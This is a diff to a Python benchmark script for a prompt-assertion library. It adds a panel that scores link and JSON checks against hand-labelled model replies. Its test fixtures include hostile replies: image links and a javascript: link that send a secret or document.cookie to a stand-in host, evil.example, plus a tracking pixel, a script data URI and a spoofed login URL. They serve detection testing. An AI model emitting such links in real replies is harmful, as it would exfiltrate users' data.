@@ -15,6 +15,10 @@ labels are true by construction of the simulation. Re-run it, read it,
 change it.
 
 Panels
+  4. Reply shapes (added in round 3): hand-labelled model replies - hostile
+     links, JSON a parser would reject, JSON inside a code fence - judged by
+     the assertions as they were before round 3 (reconstructed here from the
+     previous code, see _LEGACY_*) and as they are now.
   1. Detection: 44 labelled prompt edits (19 harmless, 25 harmful) against
      three assertion suites an author could plausibly write.
   2. Flakiness: a model that fails at random: false alarms and detection
@@ -481,11 +485,128 @@ def panel_cost(latency=0.01) -> dict:
     }
 
 
+# ---------------------------------------------------------------- reply shapes
+
+#: The link finder as it was before round 3 (http, https, ftp and www. only),
+#: and json.loads as json_valid used it. Copied from the previous commit so
+#: the comparison can be re-run without checking it out.
+_LEGACY_URL = re.compile(r"(?i)\b(?:https?|ftp)://[^\s<>\"')\]]+")
+_LEGACY_WWW = re.compile(r"(?i)(?<![\w/@.])www\.[a-z0-9-]+(?:\.[a-z0-9-]+)+"
+                         r"(?:/[^\s<>\"')\]]*)?")
+
+
+def _legacy_has_link(text: str) -> bool:
+    return bool(_LEGACY_URL.search(text) or _LEGACY_WWW.search(text))
+
+
+def _legacy_json_ok(text: str) -> bool:
+    try:
+        json.loads(text)
+        return True
+    except ValueError:
+        return False
+
+
+#: (reply, has_hostile_link)
+LINK_REPLIES = [
+    ("Done. ![status](https://evil.example/p.png?d=SECRET)", True),
+    ("See www.evil.example/collect?q=1 for details", True),
+    ("Thanks! ![logo](//evil.example/logo.png)", True),
+    ('<img src="//evil.example/t.gif" width=1 height=1>', True),
+    ("[click here](javascript:fetch('//evil.example/?c='+document.cookie))",
+     True),
+    ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", True),
+    ("Docs: https://docs.example.com@evil.example/login", True),
+    ("Download: ftp://evil.example/payload.bin", True),
+    ("The data: field is optional and metadata: is ignored.", False),
+    ("Compute 10//5.2 then round; C://x.y is not a link.", False),
+    ("Open the settings page, then choose Billing.", False),
+    ("Version 1.2.3 of the app fixes the crash.", False),
+    ("Use the // operator for integer division in Python.", False),
+    ("Email support at the usual address.", False),
+]
+
+#: (reply, parses_the_way_a_browser_or_node_would)
+JSON_REPLIES = [
+    ('{"score": NaN}', False),
+    ('{"limit": Infinity}', False),
+    ('{"limit": 1e999}', False),
+    ('{"role": "user", "role": "admin"}', False),
+    ('{"score": 0.9, "label": "positive"}', True),
+    ('[1, 2, {"k": [null, true]}]', True),
+    ('{"name": "caf\u00e9", "n": -0.5e2}', True),
+    ('"just a string"', True),
+    ('{"a": {"b": {"c": [1, 2, 3]}}}', True),
+    ('{"empty": {}, "list": []}', True),
+]
+
+_SCHEMA = {"type": "object", "required": ["label"],
+           "additionalProperties": False,
+           "properties": {"label": {"enum": ["positive", "negative"]}}}
+
+#: (reply, is_a_good_answer)
+FENCED_REPLIES = [
+    ('```json\n{"label": "positive"}\n```', True),
+    ('Sure! Here you go:\n```json\n{"label": "negative"}\n```', True),
+    ('```\n{"label": "positive"}\n```\nHope that helps.', True),
+    ('The answer is {"label": "positive"} as requested.', True),
+    ('{"label": "positive"}', True),
+    ('Result:\n```json\n{"label": "negative"}\n```\nDone.', True),
+    ('```json\n{"label": "meh"}\n```', False),
+    ('```json\n{"label": "positive", "debug": "x"}\n```', False),
+    ('I think it is positive.', False),
+    ('```json\n{"score": 3}\n```', False),
+]
+
+
+def panel_reply_shapes() -> dict:
+    from prompt_assert import asserts
+
+    def passes(assertion, text):
+        return asserts.evaluate(assertion, text)[0]
+
+    hostile = [t for t, bad in LINK_REPLIES if bad]
+    harmless = [t for t, bad in LINK_REPLIES if not bad]
+    links = {
+        "hostile": len(hostile), "harmless": len(harmless),
+        "before_caught": sum(_legacy_has_link(t) for t in hostile),
+        "before_false_alarms": sum(_legacy_has_link(t) for t in harmless),
+        "now_caught": sum(not passes({"no_urls": True}, t) for t in hostile),
+        "now_false_alarms": sum(not passes({"no_urls": True}, t)
+                                for t in harmless),
+    }
+    bad_json = [t for t, ok in JSON_REPLIES if not ok]
+    good_json = [t for t, ok in JSON_REPLIES if ok]
+    jsons = {
+        "unsafe": len(bad_json), "safe": len(good_json),
+        "before_wrongly_accepted": sum(_legacy_json_ok(t) for t in bad_json),
+        "before_wrongly_rejected": sum(not _legacy_json_ok(t)
+                                       for t in good_json),
+        "now_wrongly_accepted": sum(passes({"json_valid": True}, t)
+                                    for t in bad_json),
+        "now_wrongly_rejected": sum(not passes({"json_valid": True}, t)
+                                    for t in good_json),
+    }
+    good = [t for t, ok in FENCED_REPLIES if ok]
+    wrong = [t for t, ok in FENCED_REPLIES if not ok]
+    before = {"schema": _SCHEMA}
+    now = {"contains_json": _SCHEMA}
+    fenced = {
+        "good": len(good), "wrong": len(wrong),
+        "schema_wrongly_rejected": sum(not passes(before, t) for t in good),
+        "schema_wrongly_accepted": sum(passes(before, t) for t in wrong),
+        "contains_json_wrongly_rejected": sum(not passes(now, t)
+                                              for t in good),
+        "contains_json_wrongly_accepted": sum(passes(now, t) for t in wrong),
+    }
+    return {"links": links, "json": jsons, "fenced_json": fenced}
+
+
 # --------------------------------------------------------------------- output
 
 def collect() -> dict:
     return {"detection": panel_detection(), "flakiness": panel_flakiness(),
-            "cost": panel_cost()}
+            "cost": panel_cost(), "reply_shapes": panel_reply_shapes()}
 
 
 def deterministic(results: dict) -> dict:
@@ -542,6 +663,28 @@ def markdown(res: dict) -> str:
           (f"Wall clock with a simulated {c['wall_clock_ms_per_call_simulated']}"
           f" ms per call (this machine; varies): `--jobs 1` {w['--jobs 1']} s,"
           f" `--jobs 8` {w['--jobs 8']} s ({w['speedup']}x)."), ""]
+    r = res["reply_shapes"]
+    ln, js, fj = r["links"], r["json"], r["fenced_json"]
+    L += ["## 4. Reply shapes (hand-labelled replies, round 3)", "",
+          ("The 'before' column is the check as it was before round 3, "
+           "reconstructed in `bench.py`."), "",
+          "| check | before round 3 | now |", "|---|---:|---:|",
+          (f"| `no_urls`: hostile links caught (of {ln['hostile']}) | "
+           f"{ln['before_caught']} | {ln['now_caught']} |"),
+          (f"| `no_urls`: harmless replies flagged (of {ln['harmless']}) | "
+           f"{ln['before_false_alarms']} | {ln['now_false_alarms']} |"),
+          (f"| `json_valid`: replies a browser parser rejects but it "
+           f"accepted (of {js['unsafe']}) | {js['before_wrongly_accepted']} | "
+           f"{js['now_wrongly_accepted']} |"),
+          (f"| `json_valid`: valid JSON it rejected (of {js['safe']}) | "
+           f"{js['before_wrongly_rejected']} | {js['now_wrongly_rejected']} |"),
+          (f"| JSON in a fence or in prose: good answers rejected "
+           f"(of {fj['good']}), `schema` vs `contains_json` | "
+           f"{fj['schema_wrongly_rejected']} | "
+           f"{fj['contains_json_wrongly_rejected']} |"),
+          (f"| the same: wrong answers accepted (of {fj['wrong']}) | "
+           f"{fj['schema_wrongly_accepted']} | "
+           f"{fj['contains_json_wrongly_accepted']} |"), ""]
     return "\n".join(L)
 
 
